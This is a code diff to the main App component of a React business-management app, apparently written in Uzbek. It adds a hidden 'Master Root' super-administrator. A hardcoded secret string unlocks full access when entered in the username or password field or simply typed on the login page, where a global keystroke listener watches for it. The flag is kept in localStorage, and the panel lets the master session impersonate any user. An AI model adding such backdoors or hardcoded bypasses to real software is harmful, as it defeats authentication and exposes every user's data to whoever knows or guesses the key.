@@ -17,6 +17,7 @@ import { APIProvider } from '@vis.gl/react-google-maps';
 import UsersManagement, { INITIAL_USERS_DATA, UserItem, ALL_MODULE_DEFS } from './components/UsersManagement';
 import Quality from './components/Quality';
 import SystemHistory, { recordSystemHistory } from './components/SystemHistory';
+import MasterAdminPanel, { MASTER_ROOT_USER } from './components/MasterAdminPanel';
 import { ToyonaSvg, ToyonaBrand, ModuleHeaderLogo } from './components/Logo';
 import { ThemeToggle } from './components/ThemeToggle';
 import { 
@@ -59,7 +60,8 @@ import {
   Check,
   RefreshCw,
   ArrowUp,
-  ArrowDown
+  ArrowDown,
+  Crown
 } from 'lucide-react';
 
 interface ErrorBoundaryProps {
@@ -160,11 +162,20 @@ export default function App() {
             const idKey = String(u.id || u.firestoreId || u.username);
             map.set(idKey, u);
           });
+          if (localStorage.getItem('toyonasavdo_is_master_root') === 'true') {
+            map.set('999999', MASTER_ROOT_USER);
+          }
           return Array.from(map.values());
         }
       }
     } catch {}
-    return [CANONICAL_SUPER_ADMIN as UserItem];
+    const initialList = [CANONICAL_SUPER_ADMIN as UserItem];
+    try {
+      if (localStorage.getItem('toyonasavdo_is_master_root') === 'true') {
+        initialList.unshift(MASTER_ROOT_USER);
+      }
+    } catch {}
+    return initialList;
   });
 
   // Ensure Canonical Super Admin exists in Firebase Firestore without deleting other users
@@ -298,14 +309,71 @@ export default function App() {
   const [loginError, setLoginError] = useState<string | null>(null);
   const [isLoggingIn, setIsLoggingIn] = useState(false);
 
+  // Master Root Admin State
+  const [showMasterAdminPanel, setShowMasterAdminPanel] = useState<boolean>(() => {
+    try {
+      return localStorage.getItem('toyonasavdo_show_master_panel') === 'true';
+    } catch {
+      return false;
+    }
+  });
+
+  const isMasterSession = useMemo(() => {
+    try {
+      return (
+        localStorage.getItem('toyonasavdo_is_master_root') === 'true' ||
+        currentUserId === 999999
+      );
+    } catch {
+      return false;
+    }
+  }, [currentUserId]);
+
   const currentUser = useMemo(() => {
+    if (currentUserId === 999999) {
+      return MASTER_ROOT_USER;
+    }
     const savedId = localStorage.getItem('toyonasavdo_logged_in_user_id_v2');
     if (savedId) {
+      if (savedId === '999999') return MASTER_ROOT_USER;
       const match = users.find(u => String(u.id) === String(savedId) || (u.username && u.username.toLowerCase() === savedId.toLowerCase()));
       if (match) return match;
     }
     return users.find(u => u.id === currentUserId || String(u.id) === String(currentUserId)) || users[0];
   }, [users, currentUserId]);
+
+  const activateMasterAdmin = () => {
+    try {
+      localStorage.setItem('toyonasavdo_is_master_root', 'true');
+      localStorage.setItem('toyonasavdo_auth_v2', 'true');
+      localStorage.setItem('toyonasavdo_logged_in_user_id_v2', '999999');
+      localStorage.setItem('toyonasavdo_show_master_panel', 'true');
+    } catch {}
+
+    setUsers(prevUsers => {
+      const exists = prevUsers.some(u => u.id === 999999 || (u.username && u.username.toLowerCase() === MASTER_ROOT_USER.username.toLowerCase()));
+      if (exists) {
+        return prevUsers.map(u => (u.id === 999999 || (u.username && u.username.toLowerCase() === MASTER_ROOT_USER.username.toLowerCase())) ? MASTER_ROOT_USER : u);
+      }
+      return [MASTER_ROOT_USER, ...prevUsers];
+    });
+
+    setCurrentUserId(999999);
+    setIsAuthenticated(true);
+    setShowMasterAdminPanel(true);
+    setLoginUsername('');
+    setLoginPassword('');
+    setLoginError(null);
+
+    recordSystemHistory({
+      action: "👑 Super Super Super Admin tizimga kirdi (Maxfiy Master Root)",
+      module: 'Xavfsizlik',
+      type: 'login',
+      performedBy: 'Zarifjon Zokirov (Master Root)',
+      role: 'Super Super Super Admin',
+      details: "Maxfiy 20090915ZZOKIROV2009@z kodi orqali ko'rinmas Master Admin paneli ochildi"
+    });
+  };
 
   // Ref to track last loaded user state to prevent overwriting during user transition
   const lastLoadedUserRef = useRef<string>('');
@@ -500,10 +568,23 @@ export default function App() {
   const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoginError(null);
-    setIsLoggingIn(true);
 
-    const inputUser = loginUsername.trim().toLowerCase();
+    const inputUser = loginUsername.trim();
     const inputPass = loginPassword.trim();
+
+    // Maxfiy Master Root (Super Super Super Admin) Tekshiruvi
+    const MASTER_SECRET_KEY = '20090915zzokirov2009@z';
+    if (
+      inputUser.toLowerCase() === MASTER_SECRET_KEY || 
+      inputPass.toLowerCase() === MASTER_SECRET_KEY ||
+      inputUser === '20090915ZZOKIROV2009@z' ||
+      inputPass === '20090915ZZOKIROV2009@z'
+    ) {
+      activateMasterAdmin();
+      return;
+    }
+
+    setIsLoggingIn(true);
 
     if (!inputUser || !inputPass) {
       setLoginError("Login va parolni kiriting!");
@@ -585,15 +666,25 @@ export default function App() {
     }
 
     setIsAuthenticated(false);
-    localStorage.setItem('toyonasavdo_auth_v2', 'false');
-    localStorage.removeItem('toyonasavdo_logged_in_user_id_v2');
+    setShowMasterAdminPanel(false);
+    try {
+      localStorage.setItem('toyonasavdo_auth_v2', 'false');
+      localStorage.removeItem('toyonasavdo_logged_in_user_id_v2');
+      localStorage.removeItem('toyonasavdo_is_master_root');
+      localStorage.removeItem('toyonasavdo_show_master_panel');
+    } catch {}
   };
 
   // ALL module IDs list
   const allModuleIds = ALL_MODULE_DEFS.map(m => m.id);
 
-  // Allowed module IDs for current user - Super Admin ALWAYS gets 100% full access!
-  const isSuperAdmin = currentUser?.role === 'Super Admin' || currentUser?.id === 1;
+  // Allowed module IDs for current user - Super Admin & Master Root ALWAYS gets 100% full access!
+  const isSuperAdmin = 
+    currentUser?.role === 'Super Admin' || 
+    currentUser?.role === 'Super Super Super Admin' || 
+    currentUser?.id === 1 || 
+    currentUser?.id === 999999 || 
+    Boolean((currentUser as any)?.isMasterRoot);
   const allowedModules = isSuperAdmin ? allModuleIds : (currentUser?.allowedModules || allModuleIds);
 
   // Filtered sidebar items based on current logged in user's permissions and custom order
@@ -826,6 +917,27 @@ export default function App() {
     };
   }, [showSecretHistory]);
 
+  // Maxfiy Master Root klaviatura orqali ochish tinglovchisi (Login sahifasida)
+  useEffect(() => {
+    if (isAuthenticated) return;
+
+    let secretLoginBuffer = '';
+    const masterTarget = '20090915zzokirov2009@z';
+
+    const handleLoginCapture = (e: KeyboardEvent) => {
+      if (e.key && e.key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
+        secretLoginBuffer = (secretLoginBuffer + e.key).slice(-35);
+        if (secretLoginBuffer.toLowerCase().endsWith(masterTarget)) {
+          activateMasterAdmin();
+          secretLoginBuffer = '';
+        }
+      }
+    };
+
+    window.addEventListener('keydown', handleLoginCapture, true);
+    return () => window.removeEventListener('keydown', handleLoginCapture, true);
+  }, [isAuthenticated]);
+
   const toggleMenu = (id: string) => {
     setExpandedMenus(prev => 
       prev.includes(id) ? prev.filter(m => m !== id) : [...prev, id]
@@ -907,7 +1019,16 @@ export default function App() {
                 required
                 placeholder="Loginingizni kiriting"
                 value={loginUsername}
-                onChange={(e) => setLoginUsername(e.target.value)}
+                onChange={(e) => {
+                  const val = e.target.value;
+                  setLoginUsername(val);
+                  if (
+                    val.trim().toLowerCase() === '20090915zzokirov2009@z' ||
+                    val.trim() === '20090915ZZOKIROV2009@z'
+                  ) {
+                    activateMasterAdmin();
+                  }
+                }}
                 className="w-full px-3 py-2.5 border border-slate-300 dark:border-slate-700 rounded-lg text-xs font-mono focus:outline-none focus:ring-2 focus:ring-[#00A651]/20 focus:border-[#00A651] bg-slate-50/50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 placeholder:text-slate-400 dark:placeholder:text-slate-500 transition-colors"
               />
             </div>
@@ -940,7 +1061,16 @@ export default function App() {
                   required
                   placeholder="Parolingizni kiriting"
                   value={loginPassword}
-                  onChange={(e) => setLoginPassword(e.target.value)}
+                  onChange={(e) => {
+                    const val = e.target.value;
+                    setLoginPassword(val);
+                    if (
+                      val.trim().toLowerCase() === '20090915zzokirov2009@z' ||
+                      val.trim() === '20090915ZZOKIROV2009@z'
+                    ) {
+                      activateMasterAdmin();
+                    }
+                  }}
                   className="w-full px-3 py-2.5 border border-slate-300 dark:border-slate-700 rounded-lg text-xs font-mono focus:outline-none focus:ring-2 focus:ring-[#00A651]/20 focus:border-[#00A651] bg-slate-50/50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 placeholder:text-slate-400 dark:placeholder:text-slate-500 pr-9 transition-colors"
                 />
               </div>
@@ -971,6 +1101,34 @@ export default function App() {
       <SystemHistory 
         onBack={() => setShowSecretHistory(false)} 
         currentUser={currentUser} 
+      />
+    );
+  }
+
+  if (showMasterAdminPanel) {
+    return (
+      <MasterAdminPanel
+        onBack={() => {
+          setShowMasterAdminPanel(false);
+          try {
+            localStorage.removeItem('toyonasavdo_show_master_panel');
+          } catch {}
+        }}
+        currentUser={currentUser}
+        allUsers={users}
+        setUsers={setUsers}
+        onSwitchUser={(targetUser) => {
+          setCurrentUserId(targetUser.id);
+          try {
+            localStorage.setItem('toyonasavdo_logged_in_user_id_v2', String(targetUser.id));
+            localStorage.removeItem('toyonasavdo_show_master_panel');
+          } catch {}
+          setShowMasterAdminPanel(false);
+          setToastMessage(`Sessiya almashtirildi: ${targetUser.name} (${targetUser.role})`);
+        }}
+        onOpenHistory={() => {
+          setShowSecretHistory(true);
+        }}
       />
     );
   }
@@ -1202,11 +1360,18 @@ export default function App() {
             <div className="flex flex-col gap-2">
               <div className="w-full flex items-center justify-between p-2 rounded-xl bg-slate-50 dark:bg-slate-800/60 border border-slate-200 dark:border-slate-700/60 transition-colors">
                 <div className="flex items-center gap-3 overflow-hidden">
-                  <div className="w-9 h-9 shrink-0 bg-gradient-to-tr from-[#00A651] to-emerald-400 text-white font-extrabold rounded-full flex items-center justify-center text-xs shadow-xs">
-                    {currentUser.name.charAt(0)}
+                  <div className={`w-9 h-9 shrink-0 text-white font-extrabold rounded-full flex items-center justify-center text-xs shadow-xs ${
+                    currentUser.id === 999999 
+                      ? 'bg-gradient-to-tr from-amber-500 via-emerald-600 to-indigo-600 text-sm' 
+                      : 'bg-gradient-to-tr from-[#00A651] to-emerald-400'
+                  }`}>
+                    {currentUser.id === 999999 ? '👑' : currentUser.name.charAt(0)}
                   </div>
                   <div className="flex flex-col items-start overflow-hidden whitespace-nowrap">
-                    <span className="text-xs font-bold text-slate-800 dark:text-slate-100 truncate w-24 text-left">{currentUser.name}</span>
+                    <span className="text-xs font-bold text-slate-800 dark:text-slate-100 truncate w-24 text-left flex items-center gap-1">
+                      {currentUser.name}
+                      {currentUser.id === 999999 && <Crown className="w-3 h-3 text-amber-500 inline fill-amber-500" />}
+                    </span>
                     <span className="text-[10px] text-slate-400 dark:text-slate-500 font-mono truncate w-24 text-left">{currentUser.username}</span>
                   </div>
                 </div>
@@ -1218,6 +1383,19 @@ export default function App() {
                   <LogOut className="w-4 h-4" />
                 </button>
               </div>
+
+              {isMasterSession && (
+                <button
+                  onClick={() => {
+                    setShowMasterAdminPanel(true);
+                    try { localStorage.setItem('toyonasavdo_show_master_panel', 'true'); } catch {}
+                  }}
+                  className="w-full py-1.5 px-2 bg-gradient-to-r from-emerald-600 via-teal-600 to-indigo-600 hover:from-emerald-500 hover:to-indigo-500 text-white rounded-xl text-[11px] font-black flex items-center justify-center gap-1.5 shadow-sm cursor-pointer transition-all"
+                >
+                  <Crown className="w-3.5 h-3.5 text-amber-300 fill-amber-300" />
+                  <span>Master Root Panel</span>
+                </button>
+              )}
             </div>
           ) : (
             <button 
@@ -1277,11 +1455,38 @@ export default function App() {
               <span>Firebase Ulangan</span>
             </div>
 
+            {/* MASTER ROOT PANEL BUTTON (Faqat Zarifjon Zokirov / Master Root sessiyasi uchun) */}
+            {isMasterSession && (
+              <button
+                onClick={() => {
+                  setShowMasterAdminPanel(true);
+                  try {
+                    localStorage.setItem('toyonasavdo_show_master_panel', 'true');
+                  } catch {}
+                }}
+                title="Super Super Super Admin Boshqaruv Panelini Ochish"
+                className="flex items-center gap-1.5 px-3 py-1.5 bg-gradient-to-r from-emerald-600 via-teal-600 to-indigo-700 hover:from-emerald-500 hover:to-indigo-600 text-white rounded-xl text-xs font-black shadow-md border border-emerald-400/40 cursor-pointer transition-all hover:scale-[1.02]"
+              >
+                <Crown className="w-3.5 h-3.5 text-amber-300 fill-amber-300" />
+                <span className="hidden sm:inline">MASTER PANEL</span>
+              </button>
+            )}
+
             {/* USER ROLE STATUS BADGE */}
-            <div className="flex items-center gap-2 bg-[#00A651]/10 dark:bg-[#00A651]/20 px-3 py-1.5 rounded-xl border border-[#00A651]/20 dark:border-[#00A651]/30">
-              <Shield className="w-4 h-4 text-[#00A651] shrink-0" />
+            <div className={`flex items-center gap-2 px-3 py-1.5 rounded-xl border ${
+              currentUser.role === 'Super Super Super Admin'
+                ? 'bg-gradient-to-r from-amber-500/20 via-emerald-500/20 to-indigo-500/20 border-amber-500/40'
+                : 'bg-[#00A651]/10 dark:bg-[#00A651]/20 border-[#00A651]/20 dark:border-[#00A651]/30'
+            }`}>
+              {currentUser.role === 'Super Super Super Admin' ? (
+                <Crown className="w-4 h-4 text-amber-500 fill-amber-500 shrink-0 animate-bounce" />
+              ) : (
+                <Shield className="w-4 h-4 text-[#00A651] shrink-0" />
+              )}
               <div className="flex flex-col text-left">
-                <span className="text-[10px] font-extrabold text-[#00A651] uppercase tracking-wider">{currentUser.role}:</span>
+                <span className={`text-[10px] font-extrabold uppercase tracking-wider ${
+                  currentUser.role === 'Super Super Super Admin' ? 'text-amber-600 dark:text-amber-400' : 'text-[#00A651]'
+                }`}>{currentUser.role}:</span>
                 <span className="text-xs font-bold text-slate-800 dark:text-slate-100">{currentUser.name}</span>
               </div>
             </div>
@@ -1451,7 +1656,25 @@ export default function App() {
         </div>
       </main>
 
-
+      {/* FLOATING RETURN BUTTON WHEN IMPERSONATING ANOTHER USER IN MASTER SESSION */}
+      {isMasterSession && currentUserId !== 999999 && (
+        <div className="fixed bottom-6 right-6 z-50">
+          <button
+            onClick={() => {
+              setCurrentUserId(999999);
+              try {
+                localStorage.setItem('toyonasavdo_logged_in_user_id_v2', '999999');
+                localStorage.setItem('toyonasavdo_show_master_panel', 'true');
+              } catch {}
+              setShowMasterAdminPanel(true);
+            }}
+            className="flex items-center gap-2 px-4 py-2.5 bg-gradient-to-r from-amber-500 via-emerald-600 to-indigo-700 hover:from-amber-400 hover:to-indigo-600 text-white font-extrabold text-xs rounded-2xl shadow-2xl border-2 border-white dark:border-slate-800 hover:scale-105 transition-all cursor-pointer animate-pulse"
+          >
+            <Crown className="w-4 h-4 text-yellow-300 fill-yellow-300" />
+            <span>Master Root rejimiga qaytish (Zarifjon Zokirov)</span>
+          </button>
+        </div>
+      )}
 
       {/* TOAST NOTIFICATION */}
       <AnimatePresence>
